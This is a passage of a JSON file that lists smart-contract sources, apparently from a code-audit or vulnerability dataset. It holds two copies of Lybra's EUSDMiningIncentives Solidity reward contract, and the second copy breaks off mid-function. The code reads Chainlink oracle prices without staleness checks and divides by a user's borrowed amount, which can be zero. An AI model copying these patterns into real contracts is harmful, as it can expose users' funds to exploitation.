ratio = 0\");\n\n        finishAt = block.timestamp + duration;\n        updatedAt = block.timestamp;\n        emit NotifyRewardChanged(amount, block.timestamp);\n    }\n\n    function _min(uint256 x, uint256 y) private pure returns (uint256) {\n        return x <= y ? x : y;\n    }\n}"
    },
    {
      "filename": "contracts/lybra/miner/EUSDMiningIncentives.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.17;\n/**\n * @title tokenMiner is a stripped down version of Synthetix StakingRewards.sol, to reward esLBR to EUSD minters.\n * Differences from the original contract,\n * - Get `totalStaked` from totalSupply() in contract EUSD.\n * - Get `stakedOf(user)` from getBorrowedOf(user) in contract EUSD.\n * - When an address borrowed EUSD amount changes, call the refreshReward method to update rewards to be claimed.\n */\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"../interfaces/IesLBR.sol\";\nimport \"../interfaces/IEUSD.sol\";\nimport \"../interfaces/ILybra.sol\";\nimport \"../interfaces/Iconfigurator.sol\";\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\ninterface IesLBRBoost {\n    function getUserBoost(\n        address user,\n        uint256 userUpdatedAt,\n        uint256 finishAt\n    ) external view returns (uint256);\n}\n\ncontract EUSDMiningIncentives is Ownable {\n    Iconfigurator public immutable configurator;\n    IesLBRBoost public esLBRBoost;\n    IEUSD public immutable EUSD;\n    address public esLBR;\n    address public LBR;\n    address[] public pools;\n\n    // Duration of rewards to be paid out (in seconds)\n    uint256 public duration = 2_592_000;\n    // Timestamp of when the rewards finish\n    uint256 public finishAt;\n    // Minimum of last updated time and reward finish time\n    uint256 public updatedAt;\n    // Reward to be paid out per second\n    uint256 public rewardRatio;\n    // Sum of (reward ratio * dt * 1e18 / total supply)\n    uint256 public rewardPerTokenStored;\n    // User address => rewardPerTokenStored\n    mapping(address => uint256) public userRewardPerTokenPaid;\n    // User address => rewards to be claimed\n    mapping(address => uint256) public rewards;\n    mapping(address => uint256) public userUpdatedAt;\n    uint256 public extraRatio = 50 * 1e18;\n    uint256 public peUSDExtraRatio = 10 * 1e18;\n    uint256 public biddingFeeRatio = 3000;\n    address public ethlbrStakePool;\n    address public ethlbrLpToken;\n    AggregatorV3Interface internal etherPriceFeed;\n    AggregatorV3Interface internal lbrPriceFeed;\n    bool public isEUSDBuyoutAllowed = true;\n\n    event ClaimReward(address indexed user, uint256 amount, uint256 time);\n    event ClaimedOtherEarnings(address indexed user, address indexed Victim, uint256 buyAmount, uint256 biddingFee, bool useEUSD, uint256 time);\n    event NotifyRewardChanged(uint256 addAmount, uint256 time);\n\n    //etherOracle = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419\n    constructor(address _config, address _boost, address _etherOracle, address _lbrOracle) {\n        configurator = Iconfigurator(_config);\n        esLBRBoost = IesLBRBoost(_boost);\n        EUSD = IEUSD(configurator.getEUSDAddress());\n        etherPriceFeed = AggregatorV3Interface(_etherOracle);\n        lbrPriceFeed = AggregatorV3Interface(_lbrOracle);\n    }\n\n    modifier updateReward(address _account) {\n        rewardPerTokenStored = rewardPerToken();\n        updatedAt = lastTimeRewardApplicable();\n\n        if (_account != address(0)) {\n            rewards[_account] = earned(_account);\n            userRewardPerTokenPaid[_account] = rewardPerTokenStored;\n            userUpdatedAt[_account] = block.timestamp;\n        }\n        _;\n    }\n\n    function setToken(address _lbr, address _eslbr) external onlyOwner {\n        LBR = _lbr;\n        esLBR = _eslbr;\n    }\n\n    function setLBROracle(address _lbrOracle) external onlyOwner {\n        lbrPriceFeed = AggregatorV3Interface(_lbrOracle);\n    }\n\n    function setPools(address[] memory _pools) external onlyOwner {\n        for (uint i = 0; i < _pools.length; i++) {\n            require(configurator.mintVault(_pools[i]), \"NOT_VAULT\");\n        }\n        pools = _pools;\n    }\n\n    function setBiddingCost(uint256 _biddingRatio) external onlyOwner {\n        require(_biddingRatio <= 8000, \"BCE\");\n        biddingFeeRatio = _biddingRatio;\n    }\n\n    function setExtraRatio(uint256 ratio) external onlyOwner {\n        require(ratio <= 1e20, \"BCE\");\n        extraRatio = ratio;\n    }\n\n    function setPeUSDExtraRatio(uint256 ratio) external onlyOwner {\n        require(ratio <= 1e20, \"BCE\");\n        peUSDExtraRatio = ratio;\n    }\n\n    function setBoost(address _boost) external onlyOwner {\n        esLBRBoost = IesLBRBoost(_boost);\n    }\n\n    function setRewardsDuration(uint256 _duration) external onlyOwner {\n        require(finishAt < block.timestamp, \"reward duration not finished\");\n        duration = _duration;\n    }\n\n    function setEthlbrStakeInfo(address _pool, address _lp) external onlyOwner {\n        ethlbrStakePool = _pool;\n        ethlbrLpToken = _lp;\n    }\n    function setEUSDBuyoutAllowed(bool _bool) external onlyOwner {\n        isEUSDBuyoutAllowed = _bool;\n    }\n\n    function totalStaked() internal view returns (uint256) {\n        return EUSD.totalSupply();\n    }\n\n    function stakedOf(address user) public view returns (uint256) {\n        uint256 amount;\n        for (uint i = 0; i < pools.length; i++) {\n            ILybra pool = ILybra(pools[i]);\n            uint borrowed = pool.getBorrowedOf(user);\n            if (pool.getVaultType() == 1) {\n                borrowed = borrowed * (1e20 + peUSDExtraRatio) / 1e20;\n            }\n            amount += borrowed;\n        }\n        return amount;\n    }\n\n    function stakedLBRLpValue(address user) public view returns (uint256) {\n        uint256 totalLp = IEUSD(ethlbrLpToken).totalSupply();\n        (, int etherPrice, , , ) = etherPriceFeed.latestRoundData();\n        (, int lbrPrice, , , ) = lbrPriceFeed.latestRoundData();\n        uint256 etherInLp = (IEUSD(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(ethlbrLpToken) * uint(etherPrice)) / 1e8;\n        uint256 lbrInLp = (IEUSD(LBR).balanceOf(ethlbrLpToken) * uint(lbrPrice)) / 1e8;\n        uint256 userStaked = IEUSD(ethlbrStakePool).balanceOf(user);\n        return (userStaked * (lbrInLp + etherInLp)) / totalLp;\n    }\n\n    function lastTimeRewardApplicable() public view returns (uint256) {\n        return _min(finishAt, block.timestamp);\n    }\n\n    function rewardPerToken() public view returns (uint256) {\n        if (totalStaked() == 0) {\n            return rewardPerTokenStored;\n        }\n\n        return rewardPerTokenStored + (rewardRatio * (lastTimeRewardApplicable() - updatedAt) * 1e18) / totalStaked();\n    }\n\n    /**\n     * @notice Update user's claimable reward data and record the timestamp.\n     */\n    function refreshReward(address _account) external updateReward(_account) {}\n\n    function getBoost(address _account) public view returns (uint256) {\n        uint256 redemptionBoost;\n        if (configurator.isRedemptionProvider(_account)) {\n            redemptionBoost = extraRatio;\n        }\n        return 100 * 1e18 + redemptionBoost + esLBRBoost.getUserBoost(_account, userUpdatedAt[_account], finishAt);\n    }\n\n    function earned(address _account) public view returns (uint256) {\n        return ((stakedOf(_account) * getBoost(_account) * (rewardPerToken() - userRewardPerTokenPaid[_account])) / 1e38) + rewards[_account];\n    }\n\n    function isOtherEarningsClaimable(address user) public view returns (bool) {\n        return (stakedLBRLpValue(user) * 10000) / stakedOf(user) < 500;\n    }\n\n    function getReward() external updateReward(msg.sender) {\n        require(!isOtherEarningsClaimable(msg.sender), \"Insufficient DLP, unable to claim rewards\");\n        uint256 reward = rewards[msg.sender];\n        if (reward > 0) {\n            rewards[msg.sender] = 0;\n            IesLBR(esLBR).mint(msg.sender, reward);\n            emit ClaimReward(msg.sender, reward, block.timestamp);\n        }\n    }\n\n    function purchaseOtherEarnings(address user, bool useEUSD) external updateReward(user) {\n        require(isOtherEarningsClaimable(user), \"The rewards of the user cannot be bought out\");\n        if(useEUSD) {\n            require(isEUSDBuyoutAllowed, \"The purchase using EUSD is not permitted.\");\n        }\n        uint256 reward = rewards[user];\n        if (reward > 0) {\n            rewards[user] = 0;\n            uint256 biddingFee = (reward * biddingFeeRatio) / 10000;\n            if(useEUSD) {\n                (, int lbrPrice, , , ) = lbrPriceFeed.latestRoundData();\n                biddingFee = biddingFee * uint256(lbrPrice) / 1e8;\n                bool success = EUSD.transferFrom(msg.sender, address(configurator), biddingFee);\n                require(success, \"TF\");\n                try configurator.distributeRewards() {} catch {}\n            } else {\n                IesLBR(LBR).burn(msg.sender, biddingFee);\n            }\n            IesLBR(esLBR).mint(msg.sender, reward);\n\n            emit ClaimedOtherEarnings(msg.sender, user, reward, biddingFee, useEUSD, block.timestamp);\n        }\n    }\n\n    function notifyRewardAmount(\n        uint256 amount\n    ) external onlyOwner updateReward(address(0)) {\n        require(amount > 0, \"amount = 0\");\n        if (block.timestamp >= finishAt) {\n            rewardRatio = amount / duration;\n        } else {\n            uint256 remainingRewards = (finishAt - block.timestamp) * rewardRatio;\n            rewardRatio = (amount + remainingRewards) / duration;\n        }\n\n        require(rewardRatio > 0, \"reward ratio = 0\");\n\n        finishAt = block.timestamp + duration;\n        updatedAt = block.timestamp;\n        emit NotifyRewardChanged(amount, block.timestamp);\n    }\n\n    function _min(uint256 x, uint256 y) private pure returns (uint256) {\n        return x <= y ? x : y;\n    }\n}"
    },
    {
      "filename": "contracts/lybra/miner/EUSDMiningIncentives.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.17;\n/**\n * @title tokenMiner is a stripped down version of Synthetix StakingRewards.sol, to reward esLBR to EUSD minters.\n * Differences from the original contract,\n * - Get `totalStaked` from totalSupply() in contract EUSD.\n * - Get `stakedOf(user)` from getBorrowedOf(user) in contract EUSD.\n * - When an address borrowed EUSD amount changes, call the refreshReward method to update rewards to be claimed.\n */\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"../interfaces/IesLBR.sol\";\nimport \"../interfaces/IEUSD.sol\";\nimport \"../interfaces/ILybra.sol\";\nimport \"../interfaces/Iconfigurator.sol\";\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\ninterface IesLBRBoost {\n    function getUserBoost(\n        address user,\n        uint256 userUpdatedAt,\n        uint256 finishAt\n    ) external view returns (uint256);\n}\n\ncontract EUSDMiningIncentives is Ownable {\n    Iconfigurator public immutable configurator;\n    IesLBRBoost public esLBRBoost;\n    IEUSD public immutable EUSD;\n    address public esLBR;\n    address public LBR;\n    address[] public pools;\n\n    // Duration of rewards to be paid out (in seconds)\n    uint256 public duration = 2_592_000;\n    // Timestamp of when the rewards finish\n    uint256 public finishAt;\n    // Minimum of last updated time and reward finish time\n    uint256 public updatedAt;\n    // Reward to be paid out per second\n    uint256 public rewardRatio;\n    // Sum of (reward ratio * dt * 1e18 / total supply)\n    uint256 public rewardPerTokenStored;\n    // User address => rewardPerTokenStored\n    mapping(address => uint256) public userRewardPerTokenPaid;\n    // User address => rewards to be claimed\n    mapping(address => uint256) public rewards;\n    mapping(address => uint256) public userUpdatedAt;\n    uint256 public extraRatio = 50 * 1e18;\n    uint256 public peUSDExtraRatio = 10 * 1e18;\n    uint256 public biddingFeeRatio = 3000;\n    address public ethlbrStakePool;\n    address public ethlbrLpToken;\n    AggregatorV3Interface internal etherPriceFeed;\n    AggregatorV3Interface internal lbrPriceFeed;\n    bool public isEUSDBuyoutAllowed = true;\n\n    event ClaimReward(address indexed user, uint256 amount, uint256 time);\n    event ClaimedOtherEarnings(address indexed user, address indexed Victim, uint256 buyAmount, uint256 biddingFee, bool useEUSD, uint256 time);\n    event NotifyRewardChanged(uint256 addAmount, uint256 time);\n\n    //etherOracle = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419\n    constructor(address _config, address _boost, address _etherOracle, address _lbrOracle) {\n        configurator = Iconfigurator(_config);\n        esLBRBoost = IesLBRBoost(_boost);\n        EUSD = IEUSD(configurator.getEUSDAddress());\n        etherPriceFeed = AggregatorV3Interface(_etherOracle);\n        lbrPriceFeed = AggregatorV3Interface(_lbrOracle);\n    }\n\n    modifier updateReward(address _account) {\n        rewardPerTokenStored = rewardPerToken();\n        updatedAt = lastTimeRewardApplicable();\n\n        if (_account != address(0)) {\n            rewards[_account] = earned(_account);\n            userRewardPerTokenPaid[_account] = rewardPerTokenStored;\n            userUpdatedAt[_account] = block.timestamp;\n        }\n        _;\n    }\n\n    function setToken(address _lbr, address _eslbr) external onlyOwner {\n        LBR = _lbr;\n        esLBR = _eslbr;\n    }\n\n    function setLBROracle(address _lbrOracle) external onlyOwner {\n        lbrPriceFeed = AggregatorV3Interface(_lbrOracle);\n    }\n\n    function setPools(address[] memory _pools) external onlyOwner {\n        for (uint i = 0; i < _pools.length; i++) {\n            require(configurator.mintVault(_pools[i]), \"NOT_VAULT\");\n        }\n        pools = _pools;\n    }\n\n    function setBiddingCost(uint256 _biddingRatio) external onlyOwner {\n        require(_biddingRatio <= 8000, \"BCE\");\n        biddingFeeRatio = _biddingRatio;\n    }\n\n    function setExtraRatio(uint256 ratio) external onlyOwner {\n        require(ratio <= 1e20, \"BCE\");\n        extraRatio = ratio;\n    }\n\n    fun"
    }
  ]
}